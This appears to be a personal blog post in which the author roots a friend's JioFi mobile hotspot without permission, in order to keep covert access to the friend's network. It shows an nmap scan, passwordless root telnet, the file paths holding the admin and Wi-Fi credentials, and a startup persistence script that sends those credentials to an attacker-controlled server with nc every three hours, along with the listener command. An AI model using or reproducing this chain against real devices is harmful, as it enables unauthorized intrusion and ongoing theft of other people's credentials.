---
title: "I Am Root"
description: ""
pubDate: 2021-09-08T10:50:34+03:00
draft: false
heroImage: "./featured-image.jpg"
---

# I Am Root

## Intro

Lately a friend of mine in the neighboring dorm has bought these little devices
which act as a mobile hotspot and he sometimes shares the passwords with a 
select group of people

{{< figure src="./device.jpg" width=320 title="jio m2s" >}}

And my natural cruiosity would not rest until I have away to gain access to this
network when ever I want to.

Since I don't have the time or patience to run `john` or `hashcat` I started
thinking of other ways to gain access to the network as I said before he sometimes
shares his password with selected group of people. So social engineering is 
enough to get the wifi password, but the problem is when he changes the password
and doesn't share the passowrd with anyone else so I had to come up with a plan
where I can get the password every time he changes the password.

Basically persistence, I will get back to this later. 

## Recon

Now let's run nmap on the
wifi hotspot device and see what we have.

```txt
~ > sudo nmap -sV -sC -T4 --min-rate=1000 192.168.1.1
[sudo] password for omer:
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-29 14:46 EAT
Nmap scan report for 192.168.1.1
Host is up (0.018s latency).
Not shown: 993 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     BusyBox ftpd (D-Link DCS-932L IP-Cam camera)
| ftp-syst:
|   STAT:
| Server status:
|  TYPE: BINARY
|_Ok
|_ftp-bounce: bounce working!
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 8
| drwxr-xr-x    3 root     root           224 Feb 16  2017 WEBSERVER
| drwxr-xr-x    8 root     root           608 Jan  1  1970 app
| drwxr-xr-x    2 root     root         15664 Feb 16  2017 bin
| drwxr-xr-x    2 root     root           160 Feb 16  2017 boot
| -rw-r--r--    1 root     root           128 Feb 16  2017 build.prop
| lrwxrwxrwx    1 root     root            14 Jan  5  1970 cache -> /ww_bata/cache
| drwxr-xr-x    2 root     root           160 Feb 16  2017 data
| drwxr-xr-x    8 root     root          4620 Jan  5  1970 dev
| drwxr-xr-x   23 root     root          4968 Jan  5  1970 etc
| drwxrwxr-x    3 1000     1000           224 Feb 16  2017 firmware
| drwxr-xr-x    3 root     root           224 Feb 16  2017 home
| drwxr-xr-x    3 root     root          2344 Jan  1  1970 lib
| lrwxrwxrwx    1 root     root            12 Feb 16  2017 linuxrc -> /bin/busybox
| drwxr-xr-x   10 root     root           680 Feb 16  2017 media
| drwxr-xr-x    2 root     root           160 Feb 16  2017 mnt
| dr-xr-xr-x  145 root     root             0 Jan  1  1970 proc
| drwxr-xr-x    4 root     root           200 Jan  5  1970 run
| drwxr-xr-x    3 root     root          9040 Feb 16  2017 sbin
| lrwxrwxrwx    1 root     root            11 Feb 16  2017 sdcard -> /media/card
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
23/tcp    open  telnet
| fingerprint-strings:
|   GenericLines, NULL, RPCCheck:
|     201702161506 mdm9607-perf
|   GetRequest:
|     201702161506 mdm9607-perf
|     HTTP/1.0
|     HTTP/1.0
|     /bin/sh: GET: not found
|   Help:
|     201702161506 mdm9607-perf
|     HELP
|     HELP
|     /bin/sh: HELP: not found
|   SIPOptions:
|     201702161506 mdm9607-perf
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|     Accept: application/sdp
|     OPTIONS sip:nm SIP/2.0
|     /bin/sh: OPTIONS: not found
|     Via: SIP/2.0/TCP nm;branch=foo
|     /bin/sh: Via:: not found
|     From: <sip:nm@nm>;tag=root
|     /bin/sh: syntax error: unexpected ";"
|     <sip:nm2@nm2>
|     /bin/sh: syntax error: unexpected newline
|     Call-ID: 50000
|     /bin/sh: Call-ID:: not found
|     CSeq: 42 OPTIONS
|     /bin/sh: CSeq:: not found
|     Max-Forwards: 70
|     /bin/sh: Max-Forwards:: not found
|     Content-Length: 0
|     /bin/sh: Content-Length:: not found
|     Contact: <sip:nm@nm>
|     /bin/sh: syntax error: unexpected newline
|     Accept: application/sdp
|     /bin/sh: Accept:: not found
|     201702161506 mdm9607-perf
|     ^@IBM-3279-4-E
|_    ?IBM-3279-4-E?
53/tcp    open  domain  dnsmasq 2.76
| dns-nsid:
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    Boa HTTPd 0.94.14rc21
|_http-title: Did not follow redirect to http://jiofi.local.html
|_http-server-header: Boa/0.94.14rc21
6666/tcp  open  achat   AChat chat system
7777/tcp  open  achat   AChat chat system
52869/tcp open  upnp    MiniUPnP
```

## Getting a shell (very easy)

We have a bunch of open ports. `Nmap` also tells us that anonymous ftp login is possible.
Learning this, I went for telnet and surprisingly enough it doesn't ask for any credentials.


```txt
~ > telnet 192.168.1.1 23
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.

msm 201702161506 mdm9607-perf

/ # ls
WEBSERVER   build.prop  etc         linuxrc     run         system      var
app         cache       firmware    media       sbin        target      webui
bin         data        home        mnt         sdcard      tmp         ww_bata
boot        dev         lib         proc        sys         usr         ww_data
/ #
```

If you have a keen eyes, you will notice the `#` symbol which is a symbol used to 
indicate that you are a root user to double check this I had to run the `id` command.

```txt
/ # id
uid=0(root) gid=0(root)
```

Seems like in deeded we are root we can do what ever we want.

## Let's go hunting

My first hunt was for the wifi password. Since this is a Linux box we can use 
`grep` to search for text in files.

```txt
/ # grep -r -e security -f /
```

The `-r` is for recursive, `-e` is the pattern to search for, `-f` is where to 
search the pattern from.

Since I don't know the web portals username and password and the `grep` command was also
taking too long. I started searching manually. I found all of them in the `/ww_data/nv`
directory.

* The web portals username can be found in `user_name` file.
* The web portals password can be found in `user_password` file.
* The wifi passowrd is in the `wlan_wpa_psk` file.

```txt
/ # cd /ww_data/nv
/ww_data/nv # cat user_name; echo
<REDACTED>
/ww_data/nv # cat user_password; echo
<REDACTED>
/ww_data/nv # cat wlan_wpa_psk; echo
<REDACTED>
/ww_data/nv #
```

## Persistence 

Now comes the persistence part. My plan was to write simple POSIX shell script
and make it run at start up. The script will send the above credentials to a 
central server I control. To see if I could access the internet through
the telnet shell, I could run a `ping` command.

```txt
/ww_data/nv # ping www.google.com
PING www.google.com (142.250.185.36): 56 data bytes
```

We get a response which means we can access the internet. 
I learned from this [stackexchange questions](https://unix.stackexchange.com/questions/244060/run-script-on-startup-for-old-linux-kernel-3-0-0)
how to run script on startup. The `/etc/rc5.d/S99appautorun.sh` file is executed on
startup. We can source our custom script from here.

```sh
#!/bin/sh

while sleep 3h
do
    data="username: $(cat /ww_data/nv/user_name)\npassword: $(cat /ww_data/nv/user_password)\nwifi_password: $(cat /ww_data/nv/wlan_wpa_psk)\nwifi_name: $(cat /ww_data/nv/wlan_ssid)\n"
    echo -e $data | nc <ip> <port>
done &
```

This script will be sending the credentials to the specified `<ip>`, and `<port>` 
every 3 hour. All we have to do now is
source it in the `/etc/rc5.d/S99appautorun.sh` file.

```sh
...
source /path_to_script/script.sh
```

To setup the server all you have to do is.

```sh
$ nc -lnvp <port> | tee creds.txt
```

And we are done. Thank you for reading :)
